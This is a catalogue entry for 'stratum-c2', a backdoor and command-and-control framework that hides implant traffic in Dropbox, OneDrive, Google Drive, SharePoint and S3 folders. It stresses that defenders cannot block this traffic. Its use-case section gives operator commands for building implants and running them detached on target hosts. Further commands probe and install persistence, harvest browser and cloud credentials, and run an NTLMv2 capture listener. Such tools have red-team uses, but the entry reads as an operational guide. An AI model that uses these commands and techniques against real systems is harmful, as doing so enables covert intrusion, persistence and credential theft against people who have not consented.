---
name: "stratum-c2"
categories:
  - backdoor
version: "git (2026-10-27)"
homepage: "https://github.com/lame-projects/stratum-c2"
origin: "kitploit"
recipe: "upstream"
packaged-by: []
build-system: rust
meta-checked: "2026-11-09"
github-repo: "lame-projects/stratum-c2"
github-stars: 50
github-pushed: "2026-10-27"
github-archived: false
github-match: "exact"
gh-checked: "2026-11-09"
github-commits-year: 28
gh-activity-checked: "2026-11-09"
worth: 6.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
license: see repository
github-issues: 0
---

# stratum-c2

> Cloud dead-drop C2 framework: commands and beacons travel as end-to-end-encrypted files inside Dropbox/OneDrive/Google Drive/SharePoint/S3 folders — the agent never connects to attacker infrastructure.

## What it's for

Stratum is a fallback-persistence C2 framework ("the layer underneath your primary C2"). The operator side is a Python server with a multi-operator browser WebGUI; agents are compiled Rust artifacts with no runtime dependencies — Windows PE `.exe`/`.dll`, musl-static Linux `.elf`, and flat x64 PIC shellcode `.bin`. All traffic is the agent polling a cloud storage folder over HTTPS — indistinguishable from an employee syncing files — with RSA-4096-OAEP key exchange and AES-256-GCM content encryption, so there is no teamserver domain, operator IP, or suspicious certificate for a defender to block: blocking the channel means blocking Dropbox or OneDrive wholesale. Five providers share one wire format and can be switched mid-engagement; deploy modes are staged-enc (one-time cloud bootstrap key), stageless-enc and stageless-plain. Agent capabilities include persistence install/probe, credential harvesting, BOF and .NET assembly execution, and file transfer. Guardrails (kill date, maintenance window, log-normal jitter) are compiled in at deploy time. Note the README's `git clone` URL (`daniomass/stratum-c2`) is stale — the live repository is `lame-projects/stratum-c2`.

No corpus evidence — derived from upstream documentation.

## Typical use cases

### Start the server and build an agent through the deploy wizard

Stand up the operator side and produce ready-to-run artifacts.

```
python3 stratum-server.py
```

Outcome: starts the server and WebGUI; open https://HOST:PORT, log in, click Deploy, and the wizard walks provider credentials, agent format, deploy mode, persistence identity and guardrails, then hands you compiled artifacts (Rust toolchain targets present on the server determine which formats build).

### Deliver the agent to a Linux target

Get the first beacon from an implanted host.

```
chmod +x stub.elf && nohup ./stub.elf &>/dev/null &
```

Outcome: the stub runs detached and beacons through the configured cloud folder; a session appears automatically in the WebGUI on first heartbeat (on Windows the equivalent is `start /b stub.exe`).

### Probe what persistence is feasible on a session

Recon persistence options before installing anything.

```
/persist probe
```

Outcome: the agent checks every persistence technique available at its current privilege and returns a non-destructive feasibility report (e.g. schtask-logon feasible, schtask-boot requires elevation); the WebGUI Persist tab tracks what you then install and remove per session.

### Harvest credentials from a session

Collect and capture credential material.

```
/creds harvest
/creds listen start smb:445
/creds listen dump
```

Outcome: harvest collects browser/cloud credentials (Firefox and cloud parsed inline, the rest staged); the listen pair starts an NTLMv2/Basic capture listener on SMB or HTTP and dumps captured credentials into the Credentials tab.

### Tear the implant down cleanly

End the engagement without leaving residue.

```
/kill
```

Outcome: removes all installed persistence, wipes local and cloud artifacts, and terminates the agent — unlike `/exit`, which only stops the process and leaves persistence in place.
